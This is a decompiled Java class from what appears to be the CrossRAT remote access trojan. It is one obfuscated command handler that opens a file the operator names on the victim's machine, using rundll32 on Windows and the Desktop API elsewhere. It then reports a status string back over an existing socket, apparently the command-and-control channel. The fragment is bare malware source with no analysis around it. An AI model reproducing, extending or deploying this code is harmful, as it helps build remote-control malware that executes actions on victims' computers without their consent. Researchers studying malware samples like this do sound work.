/*
 * Decompiled with CFR 0_124.
 */
package crossrat;

import a.a;
import a.c;
import crossrat.k;
import java.awt.Desktop;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;

final class i
extends Thread {
    private String a;

    public i(String string) {
        this.a = string;
    }

    @Override
    public final void run() {
        Exception exception;
        File file = new File(this.a);
        a a2 = c.b();
        DataOutputStream dataOutputStream = null;
        try {
            dataOutputStream = new DataOutputStream(k.k.getOutputStream());
        }
        catch (Exception exception2) {
            exception = exception2;
            exception2.printStackTrace();
        }
        if (file.exists()) {
            if (a2.a() == c.a) {
                try {
                    Runtime.getRuntime().exec(new String[]{"rundll32", "url.dll,FileProtocolHandler", file.getAbsolutePath()});
                }
                catch (IOException iOException) {
                    exception = iOException;
                    iOException.printStackTrace();
                }
            } else if (a2.a() == c.b || a2.a() == c.c) {
                try {
                    Desktop.getDesktop().open(file);
                }
                catch (IOException iOException) {
                    exception = iOException;
                    iOException.printStackTrace();
                }
            } else if (Desktop.isDesktopSupported()) {
                try {
                    Desktop.getDesktop().open(file);
                }
                catch (IOException iOException) {
                    exception = iOException;
                    iOException.printStackTrace();
                }
            }
        }
        try {
            dataOutputStream.writeBytes(String.valueOf(k.g) + k.d + k.J + k.d + "&&&");
            return;
        }
        catch (Exception exception3) {
            exception = exception3;
            exception3.printStackTrace();
            return;
        }
    }
}
